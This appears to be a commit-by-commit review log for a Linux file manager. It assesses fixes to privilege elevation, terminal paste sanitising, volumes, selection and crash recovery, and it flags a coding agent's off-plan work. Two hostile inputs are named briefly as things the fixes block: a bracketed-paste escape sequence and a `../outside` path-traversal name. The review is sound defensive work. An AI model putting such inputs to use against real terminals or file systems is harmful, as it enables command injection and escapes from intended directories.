- **Development builds cannot use admin actions.** Nothing installs `/usr/libexec/musheen-broker` yet (no packaging), so admin actions now fail in development builds. Together with 5.4 (no polkit `.policy` file), "Run as administrator" is still not usable end to end.
- **5.3 is still open:** the root "capability" is still unsigned.

**Ordering note:** this is the second out-of-order privilege commit. N1/D1, D2/D3, and the startup-load failure are still open.

### `4c22076` fix(privilege): make elevated roots non-authoritative (2026-09-23 01:12)

**Scope:** 7 files, +132/−105, in the privilege broker, the rooted store, and the UI. This commit targets audit **5.3**.

**Checks:** the privilege and broker-binary tests (31 passed) and the UI "elevat*" test (1 passed) pass on an exported copy of the commit.

**Assessment: 5.3 is fixed.**

- The unsigned `RootCapabilityDescriptor`, with its client-chosen `expires_at_unix_millis` and `grant_id`, is replaced by `ElevatedRootReference`. The reference is only the root path plus device and inode, it rejects unknown fields, and it claims no authority.
- `RootGrant::from_reference_file` now takes the grant ID and expiry from the broker's own per-request authorization (`request.request_id`, `request.authorization.expires_at_unix_millis()`).
- The provider comes from the request instead of a hard-coded `PrivilegeProvider::Polkit`. Each elevated directory read is authorized on its own, which matches how the code really behaved.
- **Nit:** in `RootedFilesystemStore::new` (`elevated_browser.rs:83`), a field named `root_identity` is filled from `grant_id()`. It is only used as the root item's key, so this is a naming inconsistency, not a bug.

**Privilege status after three commits:**

| Item | Status |
|---|---|
| 5.1 | Fixed |
| 5.2 | Mostly fixed |
| 5.3 | Fixed |
| 5.4 | **Open.** There is no polkit `.policy` file and no install of `/usr/libexec/musheen-broker`, so admin actions still do not work end to end. |

**Ordering note:** this is the third privilege commit in a row, all on real audit items. The user-facing data-safety bugs are still open: N1/D1 (the cross-device folder-removal bug, now reachable through Cut and Paste), D2/D3 (selection that picks the wrong files), and the silent startup-load failure. These affect every user. The privilege bugs affect only a feature that cannot run yet.

### `95cc9cf` fix(privilege): ship exact polkit broker policy (2026-09-23 01:24)

**Scope:** 10 files, +220/−588. This commit targets audit **5.4**. It adds `packaging/polkit/org.musheen.Musheen.policy` and `packaging/install-polkit-policy.sh`. It also **removes the broker's own polkit D-Bus check** (`privilege/polkit.rs`, 210 lines, and `tests/polkit_zbus.rs`, 311 lines).

**Checks on an exported copy of the commit:**

- `xmllint`: the policy is well-formed
- the root `polkit_policy` test: 2 passed (it checks the policy text)
- the privilege and broker-binary tests: 31 passed

**Assessment: 5.4 is fixed in design, but not verified end to end.**

- **One pkexec action per operation.** The policy defines three actions (`open-directory`, `run-executable`, `browse-directory`), each `auth_admin` for active sessions only. They are matched by `exec.path=/usr/libexec/musheen-broker` and `exec.argv1=--action-id=<id>`.
  - The launcher puts `--action-id=` first after the broker path, so pkexec picks the matching action.
  - The broker checks that the stdin request's action matches that argument (`InvocationBinding::matches`).
  - pkexec 127 is on this host, which supports the `argv1` annotation.
- **Dropping the broker's own polkit call is acceptable.** pkexec now performs the authorization for the exact action. The broker trusts `PKEXEC_UID` or `SUDO_UID` from the elevation tool, and the subject is bound to the kernel identity (5.1). This is the standard pkexec design.
- **Not verified:** the policy is not installed on this machine, and no test runs pkexec. Nobody has yet seen an admin action succeed.

**New or remaining issues:**

- **A password prompt for every elevated folder (likely).** `ProcessBrokerTransport` (`broker.rs:599`) starts a new pkexec for every request, and the policy uses `auth_admin`, not `auth_admin_keep`. Every folder opened in the elevated browser (`ReadDirectory`) would probably ask for the admin password again.
- **Large replies stall (pre-existing since `260f8f5`, high confidence).** The transport polls `try_wait()` until the broker exits, and only then reads stdout (`broker.rs:615-632`). A reply larger than the 64 KiB pipe buffer, such as a large elevated folder listing, blocks the broker on write. It never exits, and the request fails with `ExecutionTimedOut` after 120 s.
- **The installer needs a release build.** It installs `target/release/musheen-broker` into `/usr/libexec` and needs root. Nothing in the dev workflow runs it.
- **Invented URL.** `vendor_url` is `https://github.com/musheen/musheen`, but the repository is `eas4ai/musheen`.

**Privilege status after four commits:**

| Item | Status |
|---|---|
| 5.1 | Fixed |
| 5.2 | Mostly fixed |
| 5.3 | Fixed |
| 5.4 | Fixed in design, not run end to end |

**Ordering note:** this is the fourth privilege commit in a row. N1/D1, D2/D3, and the startup-load failure are still open.

### `8b51aaa` fix(terminal): sanitize pasted control sequences (2026-09-23 01:28)

**Scope:** 6 files, +42/−9. This commit targets audit **5.5**.

**Assessment: 5.5 is fixed.**

- `encode_paste` (`terminal/model.rs:181`) now keeps a character only if it is not a control character (`char::is_control`) or is one of `\n`, `\r`, `\t`.
- That removes ESC, all other C0 control characters, DEL, and the C1 range, including the one-character CSI (U+009B).
- `\x1b[201~` can no longer end bracketed paste early. This matches how common terminals clean pasted text.
- Newlines still pass through. Outside bracketed-paste mode, they are guarded by the existing confirmation dialog. The locale strings were updated to match.
- New tests cover this in both the desktop and UI terminal suites. On an exported copy of the commit, the terminal suites pass: 8 and 5 passed.

### `827c538` fix(volumes): secure long-running operations (2026-09-23 01:49)

**Scope:** 8 files, +484/−44, in the volume service, runtime, UDisks backend, UI, and locales. This commit targets audit **5.6**.

**Checks on an exported copy of the commit:**

- `musheen-desktop` volumes suite: 41 passed
- `musheen-ui` "volume" unit tests: 5 passed

**Assessment: 5.6 is fixed.**

- **Separate timeouts.** Discovery keeps a 2 s timeout (`VOLUME_DISCOVERY_TIMEOUT`). Actions get their own: Mount and Unmount 120 s, Eject and PowerOff 60 s, Unlock 300 s (`VolumeAction::request_timeout`). This leaves room for polkit prompts and LUKS key derivation.
- **Refresh after an action.** `reconcile_after_action` turns a slow or failed refresh into a warning instead of failing the action. This removes the old "UI says failed, UDisks finished" mismatch on the success path.
- **Cancellation.** `UDisksRequest` checks a `CancellationToken`. Closing the unlock dialog drops `VolumeCancellationGuard`, which cancels the request.
- **Passphrase handling.** The passphrase moves from `Box<str>` to `SecretBuffer`. It is exposed only inside `perform_volume_request`, and the input field is cleared on submit.

**Remaining issues (low):**

- **Cancelled is not undone.** Cancelling stops Musheen from waiting, but it does not cancel the UDisks job, so a "cancelled" unlock or mount may still finish. The next refresh shows the real state.
- **Plaintext copies still exist.** The passphrase is plaintext inside the third-party input widget while the user types, as the code comment says. It is also copied into the D-Bus message. Both are unavoidable with the current stack.

**Security status after six commits:** audit items 5.1–5.6 are all fixed or mostly fixed (5.4 is not run end to end).

**Ordering note:** the user-facing bugs remain open: N1/D1 (the cross-device folder-removal bug, reachable through Cut and Paste), D2/D3 (selection that picks the wrong files), and the silent startup-load failure.

### Status check, 2026-09-23 02:45 (no new commit)

**Codex is working on remote support again.** Since `827c538` (01:49), Codex has been editing the paused OpenDAL work, uncommitted in the working tree: `remote/{http,ftp,sftp,opendal_store}.rs` and `tests/opendal_contract.rs`, about 1,577 added lines.

**This breaks Codex's own plan.** Step 5 says to "resume archive/remote work only after those user-visible paths work".

**User-facing bugs still unfixed at HEAD `827c538`.** No commit since `16c41f0` touches `operation.rs`, `views/`, or `command.rs`:

- **N1/D1:** `descriptor_identity` still includes directory mtime and ctime. Cut and Paste, or drag, of a non-empty folder across devices deletes the files, then stops with `SourcePartiallyRemoved`.
- **D2:** `rubber_band_indices` still ignores the scroll offset.
- **D3:** range and rubber-band selection still use the unfiltered order.
- **D5:** Paste is still disabled when a file is selected.
- **Startup load:** still fails silently under system load.

### `9669279` feat(remote): add OpenDAL storage providers (2026-09-23 03:48)

**Scope:** 21 files, +4,768/−63.

- 1,612 lines are `Cargo.lock`.
- New dependencies: `opendal` 0.59.3, `opendal-http-transport-reqwest`, `reqwest` 0.13, `tokio` 1, `russh` 0.63, `russh-sftp` 3.
- New code:
  - `remote/opendal_store.rs` (835 lines)
  - `remote/sftp.rs` (932 lines)
  - FTP, HTTP, and WebDAV adapters
  - a Docker live-services fixture under `ci/remote-services/`
  - contract tests
  - decision record `docs/decisions/2026-09-22-opendal-sftp-blocker.md`

**Checks on an exported copy of the commit:**

- `clippy --all-features -D warnings`: pass
- `cargo test --workspace --all-features`: **931 passed**, 1 ignored, 46 filtered out
- `cargo deny check licenses`: pass

**Assessment:**

- **Plan violation.** Codex's plan says: "Resume archive/remote work only after those user-visible paths work." N1/D1, D2/D3, D5, and the startup-load failure were all open when this landed.
- **Not reachable from the UI.** `musheen-ui` references remote code only through the Settings `ConnectionTestService`. The browsing provider router (`providers.rs`) registers no OpenDAL or SFTP store, so this is about 4,700 more lines of backend with no user path.
- **Duplicate providers break the dependency rule.**
  - `tokio` is a second async runtime next to the `async-io`/`smol`/`async-executor` stack that GPUI and the rest of the app use.
  - `reqwest` is a second HTTP client next to `ureq`.
  - `docs/commitments/foundation.md` requires "no second direct provider for the same role", and the new dependencies have no `Agreed` DEP entry.
  - The decision record justifies `russh` for SFTP (DEP-012), but not tokio or reqwest.
- **Security looks sound.**
  - The SFTP host key check (`sftp.rs:716-730`) returns `false` on any error. Known-hosts mode is strict, and pin mode compares SHA-256.
  - FTPS with a pinned certificate is refused (`Unsupported`) rather than silently falling back to system roots.
  - Credentials stay in memory; the decision record rules out writing Secret Service material to temporary files.
- **To verify: SFTP pin format.** Pin mode hashes `public_key.public_key_bytes()`. If that is not the full SSH wire-format key blob, pins will not match `ssh-keygen -lf` SHA256 fingerprints. That fails safe, but pinned SFTP would be unusable.
- **Live tests do not run by default.** `tests/remote_live_contract.rs` needs the Docker services fixture, so these providers are unit and contract tested only.

**Status of user-facing bugs at `9669279`:** N1/D1, D2, D3, D5, and the startup-load failure are unchanged.

### `704d639` feat(remote): add SMB and mounted NFS providers (2026-09-23 04:19)

**Scope:** 11 files, +1,371.

- `remote/smb.rs` (729 lines) uses `pavao` 0.3.1, which binds the C library libsmbclient. It sits behind the new optional feature `smb-pavao`.
- `remote/nfs.rs` (264 lines) handles NFS shares that are already mounted.
- The commit also adds contract tests, `ci/smb-check.Dockerfile`, and two check scripts.

**Checks on an exported copy of the commit:**

- default `clippy -D warnings`: pass
- default `cargo test --workspace`: **917 passed**, 1 ignored, 46 filtered out
- **`clippy --all-features`: fail.** `pavao-sys` needs libsmbclient 0.5.0 or newer, and it is not installed on this host. The documented gate in `AGENTS.md` uses `--all-features`, so it now needs another system package (`libsmbclient-dev`).

**Findings:**

- **Encryption is optional by default.** SMB encryption defaults to `SmbEncryptionLevel::Request` and becomes `Require` only when the profile asks. A server or attacker can decline encryption without the user knowing.
- **New crate dependency.** `musheen-desktop` now depends on `musheen-local`. That edge is not in the planned crate graph in `plans/README.md`, which has desktop → ops/core.
- **Machine-specific path.** `scripts/check-smb-provider.sh` hard-codes `/home/shawn/.config/docker-hub/config`.
- **Not reachable from the UI.** The only UI references are in the Settings remote profile editor.
- **Ordering:** this is still off-plan.

### `9030351` fix(ops): complete cross-device directory moves (2026-09-23 04:24)

**Scope:** 2 files, +62/−5. This commit targets **N1** (and therefore **D1**).

**Checks on an exported copy of the commit:** the five related `musheen-local` tests pass. On this host `/dev/shm` is tmpfs and the temp directory is ext4, so the cross-device test actually ran and did not take its early return.

- `descriptor_removal_deletes_an_unchanged_directory_tree`
- `cross_device_replace_moves_a_nonempty_directory_completely`
- `cross_device_replace_preserves_verified_destination_after_partial_removal`
- two existing refusal tests

**Assessment: N1/D1 are fixed.**

- `descriptor_identity` (`operation.rs:1195`) now leaves size, mtime, and ctime out of the identity for directories only. Files keep them, so a changed file is still refused.
- Directories are still checked by mount, inode, and mode, and by the exact set of child names (`execute_descriptor_removal`). A new, removed, or swapped child is still caught.
- The new tests are the reproduction case (the same `tree/a` and `tree/nested/b` shape as `opus_repro_non_empty_directory_removal_succeeds`), plus a real tmpfs-to-ext4 Replace test.
- Cut and Paste, or drag, of a non-empty folder to another device now completes.

**Still open:**

- D2: rubber-band selection ignores the scroll offset.
- D3: selection uses the unfiltered order.
- D5: Paste is disabled with a file selected.
- The silent startup-load failure under system load.
- N2–N5 from `c6d8809`.

### `8ca028a` fix(ui): keep selection aligned with rendered items (2026-09-23 04:35)

**Scope:** 3 files, +210/−50. This commit targets **D2** and **D3**.

**Checks:** the full `musheen-ui` suite passes on an exported copy of the commit. That includes the 150 lib tests, the new `rubber_band_geometry_accounts_for_scrolled_items` and `..._partially_scrolled_row` tests, and `range_and_rubber_band_selection_follow_the_rendered_order`.

**Assessment: D2 and D3 are fixed.**

- **D2.** The list now tracks a `UniformListScrollHandle` for each tab and pane. The rubber band reads `logical_scroll_top()` for the first visible item and the partial-row offset, and multiplies rows by the column count in grid layouts.
- **D3.** Rubber-band and Shift-range selection now use `filtered_items` (the order on screen), via `select_to_item_in_order` and `rubber_band_select_ids`.
- **Remaining (low):** the rubber band still assumes a fixed 36 px row height.

### `07e13dd` fix(ui): start initial directory load synchronously (2026-09-23 04:41)

**Scope:** 1 file, +50/−1. This commit targets the **startup-load failure**.

**What it does:**

- `open_window` now calls `start_initial_load` right after the view is created. The deferred call remains as a fallback, and a `startup_load_started` flag prevents a double start.
- The directory listing still runs in the background, so the UI thread does not block.
- The omnibar shows the path again, fixing the "Musheen" text seen at `16c41f0`.

**Assessment: not fixed.** Under compile load (8–17 rustc processes, load average 9–95), `07e13dd` still showed **"0 items loaded — total unknown"** in **3 of 3** launches (`~/Documents`, the 5,000-file folder, and the 20-file folder).

**Root cause, narrowed by the lead reviewer** with temporary `eprintln!` tracing added to a scratch copy only:

```
TRACE start_load_for_tab tab=TabId { pane: 1, local: 1 } loc=/home/shawn/Documents
TRACE begin_navigation
TRACE begin_page -> Some
TRACE render status tab=TabId { pane: 1, local: 1 } visible=0 items=0 complete=false   (x2)
TRACE page result ok=true
(no further render for the remaining ~7 s)
```

- The page is read and **applied**: the weak handle upgrades, and `apply_page` does not return `Stale`.
- The status bar reads the same tab (`pane 1, local 1`).
- **No render happens after the data is applied.** The `cx.notify()` in the page-result callback (`start_next_directory_page` → `apply_directory_page_result`) does not repaint the window.
- On an idle machine the page arrives before the first frame, so the first render already shows it. That explains the idle/busy split.
- When the owner clicked a breadcrumb in an earlier session, a new load and render followed.

**Ruled out:**

- load timeouts (the listing path has none)
- stale-generation drops
- weak-handle upgrade failure
- the wrong tab
- `Entity::cached` wrappers (none in `musheen-ui`)
- the vendored gpui-pre `window.rs` patch (it only adds a test helper)

**Where to look next:** why an entity `notify` from a `cx.spawn` task after the first frame does not schedule a redraw on this Wayland/KDE setup. Candidate areas are window invalidation or frame-callback scheduling in gpui-pre, or `Root` and window-readiness handling in `run`. A targeted test would open a window, wait for one frame, then apply a page from a background task and assert that a second render happens.

### `67c990a` fix(ui): keep paste targets and cut state isolated (2026-09-23 04:57)

**Scope:** 2 files, +99/−14. This commit targets **D5** and **D8**.

**Checks:** `musheen-ui` lib tests pass on an exported copy of the commit (151 passed).

**Assessment: D5 and D8 are fixed.**

- **D5.** An active Paste (Ctrl+V or the toolbar) now builds a `MenuTarget::Background` request for the current folder with an empty selection. "Select a file, then Ctrl+V" pastes into the current folder, as other file managers do. "Paste Into" from a folder's context menu still captures that folder as the target.
- **D8.** The global `pending_paste_cut` flag is replaced by a per-transfer `clear_cut_clipboard_on_success` flag, threaded through preflight, pending drop, and submission. A rejected cut-paste no longer marks an unrelated pending drop as a cut.
- **Tests.** The new tests are in a new submodule, `app/paste_tests.rs`, instead of the 18k-line `app.rs`. This is a small step toward splitting the god file.

**User-facing bugs from the original list, status at `67c990a`:**

| Bug | Status |
|---|---|
| N1/D1 (cross-device folder removal) | Fixed |
| D2 (rubber band ignores scroll) | Fixed |
| D3 (selection uses unfiltered order) | Fixed |
| D5 (Paste disabled with a file selected) | Fixed |
| D8 (stuck cut flag) | Fixed |
| Startup load under system load | **Open.** The root cause is narrowed to a missing redraw after the first frame; see `07e13dd`. |
| D4, D6, D7, D9–D11 | Open, lower severity |

### `bb3c828` fix(ui): wake stalled Wayland repaint demand (2026-09-23 05:34)

**Scope:** the commit vendors the whole `gpui-pre-linux` 0.3.5 crate under `vendor/gpui-pre-linux`, adds about 23,400 lines, and patches it through `[patch.crates-io]`. The only file that differs from upstream is `src/linux/wayland/window.rs`, with about 100 changed lines.

**What the patch fixes:**

- In upstream `schedule_frame`, redraw demand that arrives while the window is in `FrameLoop::AwaitingCallback` is dropped. The code assumes a compositor frame callback will follow.
- KWin can withhold that callback, and then an entity `notify` after the first frame never repaints the window. This matches the trace recorded under `07e13dd`.
- The patch adds `FrameLoop::on_demand`. Demand in `AwaitingCallback` now schedules one retry through the existing upstream `schedule_frame_retry` and `RetryScheduled` path. A `frame_waker` hook is added.
- Three unit tests cover the state transitions.

**Runtime check (lead reviewer):** under compile load (10–11 rustc processes, load average 8–10), launches of `~/Documents` and the 5,000-file folder loaded at startup:

- `~/Documents`: "127 items"
- 5,000-file folder: "512 items loaded — total unknown"

The earlier failing runs used heavier load (average 25–95), so this is strong evidence, not proof under every load.

**Assessment: the startup-load failure is fixed**, and the root cause is a real GPUI Wayland frame-scheduling bug. Remaining items:

- **Fork 4 has no decision record.** `gpui-pre-linux` is now the fourth patched upstream crate. There is no `docs/decisions/` entry, even though the change is a real upstream bug fix that is worth sending upstream.
- **Large folders look sorted but are not.** The screenshot [big-folder-partial-sort.png](opus-audit/big-folder-partial-sort.png) shows the 5,000-file folder starting at `f0005, f0019, f0032, …`, with `f0001` missing from the top. Only the first 512-entry page, in readdir order, is sorted. This is the paging and sorting gap from the `16c41f0` review, now confirmed on screen.
- **Other visible issues in the same screenshots:**
  - Dates are still shown in UTC.
  - The sidebar still lists unmounted partitions and `loop*` devices as "0 B free".

### `086a8c2` fix(ops): recover replacements from destination (2026-09-23 05:44)

**Scope:** 1 file (`musheen-ui/src/operations.rs`), +86/−9. This commit targets **N2** and **N3** from `c6d8809`.

**Checks:** the `musheen-ui` lib "operations" tests pass on an exported copy of the commit (7 passed). That includes `transfer_history_records_destination_path_for_restart_recovery` and `invalid_replacement_journal_preserves_status_and_reports_error`.

**Assessment: N2 and N3 are fixed.**

- **N2.** `submit_drop` now records the destination path of each operation (`queue.operation_paths(id).nth(1)`) in the status entry instead of the source. Startup recovery (`recover_replacements_at(location)` → `location.parent()`) therefore scans the destination's folder, where Replace journals are written.
- **N3.** A recovery error no longer takes down the status hub. It is kept in `persistence_error` and shown to the user, and saved history stays loaded. A test uses a corrupt `.musheen-replace-journal-v1-*` file.
- **Remaining (low):** status entries written by builds before `086a8c2` still record source paths, so a Replace journal left by a crash in an older build is still not found. Only in-progress development builds are affected.

**Still open from `c6d8809`:**

- 4.4 (partial): merge backups are not journaled, and old `.musheen-stage-*` debris is never cleaned up.
- 4.6 (partial): the metadata report is thrown away before the user sees it.
- 4.7 (partial): the removal token is taken at removal time, not verify time.
- N4: no single-instance lock.
- N5: a partially deleted backup can later be presented as the recovered original.

### `ae45570` fix(ui): display file dates in local time (2026-09-23 05:56)

**Scope:** 6 files, +78/−46. This commit targets the UTC dates noted at `16c41f0`.

- The hand-written epoch-to-calendar code in `app.rs` is replaced by `date_time::format_modified`. It uses `jiff` and the system time zone, which is cached in a `OnceLock`.
- **Assessment: fixed.** The Modified column now shows local time with the zone abbreviation. The `date_time` unit test passes on an exported copy of the commit (1 passed).

**Remaining nits (low):**

- The date format is fixed per app language: `en-US` is always MM/DD/YYYY with a 24-hour clock. It does not follow the system locale settings (`LC_TIME`) or the desktop's date format.
- The zone abbreviation is printed on every row.
- The time zone is read once per process.
- `jiff` is a new direct dependency with no DEP entry. It is a reasonable choice, since it replaces hand-rolled calendar code.

### `361eb3b` fix(sidebar): hide internal storage devices (2026-09-23 06:04)

**Scope:** 4 files, +147/−5.

- UDisks blocks with `HintIgnore`, `HintSystem`, `Loop`, or no filesystem or encrypted interface are marked `sidebar_visible = false`.
- `sidebar.rs` filters on that flag and on `loop*` device names. Capacity is shown only for mounted volumes.

**Assessment: regression (confirmed at runtime).** Screenshot: [sidebar-pseudo-filesystems.png](opus-audit/sidebar-pseudo-filesystems.png).

- **Real data drives are hidden.** UDisks sets `HintSystem=true` on every internal partition on this machine, including the owner's working drives (`busctl` output): `/run/media/shawn/data`, `~/projects`, `~/backup`, and `~/workspace2`. All of them disappear from the sidebar. Dolphin shows these drives.
- **Pseudo filesystems now appear.** The Storage section fills with kernel and system mounts from the mount-table fallback: `bpf`, `cgroup`, `config`, `debug`, `pts`, `efivars`, `gvfs`, `hugepages`, `mqueue`, `net_cls`, `pstore`, `systemd-journald.service`, `systemd-resolved.service`, a `com.freerdp.client.cliprdr` FUSE mount, and Docker overlay IDs (`103f8a2d3f7a`, `47894d81e606`, …). The cause is `is_sidebar_volume`, which treats a volume with **no** UDisks descriptor as visible (`descriptor().is_none_or(...)`).
- **Tests miss both cases.** They check the boolean filter only. None covers a mount-table-only volume or an internal data partition.

**Suggested rule** (similar to what GVfs and Dolphin do):

1. Hide `HintIgnore`, loop devices, and blocks with no filesystem.
2. Hide system mount points: `/`, `/boot*`, `/snap/*`, `/proc`, `/sys/*`, `/dev/*`, `/run/*` except `/run/media/$USER/*`, `/var/lib/docker/*`, and similar.
3. Hide pseudo filesystem types: `cgroup*`, `bpf`, `debugfs`, `tracefs`, `devpts`, `mqueue`, `hugetlbfs`, `pstore`, `efivarfs`, `configfs`, `fusectl`, `overlay`, `nsfs`, `autofs`, `securityfs`, `binfmt_misc`, and similar.
4. **Show** `HintSystem` volumes that are mounted under `/media`, `/run/media/$USER`, `/mnt`, or `$HOME`.

### `e2551d1` fix(rename): preserve non-UTF-8 names (2026-09-23 06:08)

**Scope:** 1 file (`app.rs`), +59/−17. This commit targets **D7**.

- `NameOperation::Rename` now carries the original `OsString`.
- `submitted_rename_name` returns the original bytes when the submitted text equals the lossy display of the original name. Saving an unchanged non-UTF-8 name no longer rewrites it with U+FFFD.
- **Assessment: mostly fixed.** The rename unit test passes on an exported copy of the commit (1 passed).
- **Remaining (low):** if the user edits part of a non-UTF-8 name, for example only the extension, the U+FFFD characters from the lossy display are written into the new name. A safer rule is to refuse, or ask for confirmation, when the submitted text still contains lossy U+FFFD characters from the original.

### `8051da0` fix(integration): page FileManager1 item requests (2026-09-23 06:20)

**Scope:** 2 files, +222/−22. This commit targets **D6**.

**Checks:** the six `file_manager1_*` tests pass on an exported copy of the commit. That includes `file_manager1_pages_until_the_requested_item_is_loaded` and `file_manager1_completes_the_request_when_directory_loading_fails`.

**Assessment: D6 is fixed.**

- **Paging.** A pending ShowItems or ShowFolders selection is tied to the directory generation. While the folder is incomplete, the app requests more pages until the items are found or the folder is complete.
- **No more hangs.** The request completes with an error in three cases:
  - on a page error (`Unreachable`)
  - on cancellation or navigation away (`Unavailable`)
  - when a newer request for the same tab replaces it (`Busy`)
- **Tidy-up.** Page-error handling moves into `apply_directory_page_error`.

**Remaining (low):** a request for an item missing from a very large folder pages through the whole folder, up to the 100k retention limit, before it reports "not found".

### `22cc9c5` fix(ui): isolate rubber-band selection hits (2026-09-23 06:33)

**Scope:** 1 file (`app.rs`), +172/−7. This commit targets **D4**.

**Checks:** three new GPUI tests pass on an exported copy of the commit. They drive **simulated mouse events** (`simulate_mouse_down`, `simulate_mouse_move`, `simulate_mouse_up`), not internal method calls. This is the first input-driven selection coverage.

- `clicking_empty_directory_space_clears_the_selection`
- `dragging_the_directory_scrollbar_preserves_the_selection`
- `dragging_the_details_header_preserves_the_selection`

**Assessment: D4 is fixed.**

- `is_rubber_band_start` excludes the filter-summary chrome and the scrollbar. The scrollbar width comes from `native_theme_gpui::scrollbar_width`, with 12 px as the fallback.
- A left click on empty space that does not drag (`!moved`, mode `Replace`) now clears the selection and focus.

### `8f7942c` fix(rename): validate names and sync catalog (2026-09-23 06:42)

**Scope:** 4 files, +121/−28. This commit targets **D10** and **D11**.

**Checks:** the full `musheen-local`, `musheen-ops`, and `musheen-ui` test suites pass on an exported copy of the commit (452 passed, 0 failed).

**Assessment: D10 and D11 are fixed.**

- **D10.** `CreateRequest::destination()` and `RenameRequest::destination()` run `validate_local_name` before building the path. The queue (`queue.rs`) uses them, so names like `../outside` are refused with `InvalidName` before anything is queued. The test `create_and_rename_reject_invalid_names_before_queueing` covers this.
- **D11.** A rename now registers a `PendingCatalogMove`. When the rename completes, `catalog_binding.complete_rename` moves tags and pins to the new path. The test `completed_rename_updates_the_catalog_path` covers this.

**Remaining (low):**

- The catalog update after completion still runs on the UI thread (audit (g)).
- The name dialog itself still checks only for an empty name. Invalid names are rejected when the job is submitted, not while typing.

### `72c237a` perf(ui): persist operation status off thread (2026-09-23 06:51)

**Scope:** 3 files, +200/−21. This commit targets part of audit **(g)** and **D9**: `persist_status` wrote the status file on the UI thread.

**Checks:** the full `musheen-ui` test suite passes on an exported copy of the commit (330 passed, 0 failed).

**Assessment: fixed for status persistence.**

- A dedicated `musheen-status-persistence` thread now receives snapshots over a channel. It merges bursts, keeps the highest revision, and writes only when a newer revision arrives.
- **Ordering is correct.** `persist_status` takes a unique rising revision (`fetch_add`) *before* it snapshots the status. So the highest-revision snapshot always contains every change with a lower revision, and dropping older or out-of-order snapshots loses nothing.
- **Errors reach the user.** Write errors go into `persistence_error`, and the UI shows them (`sync_operation_persistence_error`).
- **Shutdown.** `Drop` flushes the queue and joins the worker.
- **Remaining (low):**
  - A crash can lose the last snapshots that were queued but not yet written. Recovery then uses the previous saved state.
  - Other catalog writes, such as `finish_catalog_move` and `complete_rename`, still run on the UI thread.

### `8622de0` fix(ui): preserve directory state after operations (2026-09-23 06:59)

**Scope:** 1 file (`app.rs`), +180/−1. This commit targets the `16c41f0` note that every completed operation reloaded the tab from page 1 and dropped loaded pages, scroll, and selection.

**Assessment: fixed.**

- `start_operation_directory_refresh` records the number of loaded items, the selection, the focused item, and each pane's scroll offset. It starts a reload, and `advance_directory_restore` keeps requesting pages until the same number of items is back or the folder is complete. It then restores selection, focus, and scroll.
- The restore is tied to the new generation. If the user navigates away, it is dropped.
- **Deleted items do not stay selected.** `set_selected_ids` and `focus_item` drop IDs that no longer exist, so there are no ghost selections after a delete.
- The GPUI test `operation_refresh_preserves_loaded_pages_selection_and_scroll` covers 700 items across two pages, with item 600 selected and a scroll offset. It passes, and the `musheen-ui` lib suite passes on an exported copy of the commit (162 passed, 0 failed).

### `37380e7` fix(ui): sort across directory pages (2026-09-23 07:03)

**Scope:** 2 files, +35. This commit targets the partial-sort bug confirmed at `bb3c828`, and the "only the scroll wheel loads more pages" gap from `16c41f0`.

**What it does:** after each applied page, the app requests the next page while the folder is incomplete and under the retention limit (`has_retention_capacity`, 100k). Sorting and filtering therefore cover the whole folder, as in Dolphin.

**Checks:**

- The `musheen-ui` lib suite passes on an exported copy of the commit (163 passed, 0 failed), including `directory_load_completes_paging_for_global_sorting` (700 files created in reverse order).
- **Runtime (lead reviewer):** the 5,000-file folder shows "5000 items" in order starting at `f0001`. Screenshot: [big-folder-global-sort.png](opus-audit/big-folder-global-sort.png).

**Assessment: fixed for folders up to 100k items.**

**Remaining (low):**

- Above 100k items, the listing still stops and sorts only the loaded part, with no sign in the UI beyond "loaded — total unknown".
- The list may reorder while pages are still arriving.

**Also visible in the same screenshot:** the `361eb3b` sidebar regression (pseudo filesystems shown, data drives hidden) is still present.

### `c31cea2` fix(recovery): distinguish published replacements (2026-09-23 07:09)

**Scope:** 1 file (`musheen-local/src/mutation.rs`), +116/−1. This commit targets **N5**.

**Assessment: N5 is fixed.**

- After the Replace destination is published, and **before** backup cleanup starts, `mark_published` writes `.musheen-replace-published-v1-<suffix>`. The file is created with `create_new` and mode 0600, holds a fixed marker, and gets `sync_all` plus a parent-directory fsync. If the marker cannot be written, the job becomes NeedsAttention and the backup is kept.
- Recovery behaves as follows:

  | State at restart | Recovery action |
  |---|---|
  | Marker present, destination present | The Replace had finished. Remove the backup (even if it was partly deleted) and the staging copy, then remove the marker and journal. A partial backup is never shown as "(recovered original N)". |
  | Marker present, destination missing | Stop with `RecoveryRequired` and keep the backup. |
  | Marker not a regular file, or wrong content | Stop with `RecoveryRequired`; do not guess. |
  | Crash between publish and marker | The backup is still complete, so the earlier path that offers it as a recovered original is safe. |

- The real-filesystem test `restart_never_exposes_a_partially_deleted_backup_as_an_original` covers the N5 scenario. It passes, and the `musheen-local` suite passes on an exported copy of the commit (59 passed, 0 failed).

**Still open from `c6d8809`** (all low or medium):

- 4.4: merge backups are not journaled, and old staging debris is never cleaned up.
- 4.6: the metadata report is thrown away before the user sees it.
- 4.7: the removal token is taken at removal time, not verify time.
- N4: there is no single-instance lock.

### `5e9ca8c` fix(startup): serialize recovery processes (2026-09-23 07:13)

**Scope:** 4 files, +86. This commit targets **N4**.

- New `src/instance.rs`: a per-user `instance.lock` next to the status file, taken with a non-blocking exclusive `flock` (`O_NOFOLLOW`, `O_CLOEXEC`, mode 0600) and held for the life of the process.
- `main` exits if the lock is held or cannot be taken.

**Assessment: N4 is fixed, but the fix causes a usability regression (confirmed at runtime).**

- The lock is correct: it is released automatically on exit or crash, and a unit test covers acquire, refuse, and release.
- **A second launch silently does nothing.** With one window open, running `musheen ~/Downloads` printed "Musheen is already running; refusing a concurrent recovery process" to stderr and **exited 0 with no window**. Opening a folder from a desktop shortcut, another app, or the terminal while Musheen runs now appears broken. Expected behavior is to forward the request to the running instance and open a window or tab there. D-Bus plumbing already exists and could be used, for example a Musheen-owned activation name or the `org.freedesktop.FileManager1` handler when it owns the name.
- **A lock error stops the app.** Any error other than `EWOULDBLOCK`, such as an NFS home without `flock` support or a read-only config directory, now prevents startup completely. A safer fallback is to start with startup recovery disabled and show a warning.
- **Scope.** The lock covers the whole app, not only recovery. The lock file is in `$XDG_CONFIG_HOME/musheen/`; runtime locks normally go in `$XDG_RUNTIME_DIR`.

### `d91a769` fix(recovery): journal directory merges (2026-09-23 07:19)

**Scope:** 1 file (`musheen-local/src/mutation.rs`), +149/−66. This commit targets the merge half of audit **4.4**.

**Checks:** the `musheen-local` suite passes on an exported copy of the commit (60 passed, 0 failed), including the new real-filesystem test `restart_completes_a_partially_applied_directory_merge`.

**Assessment: the merge-backup part of 4.4 is fixed.**

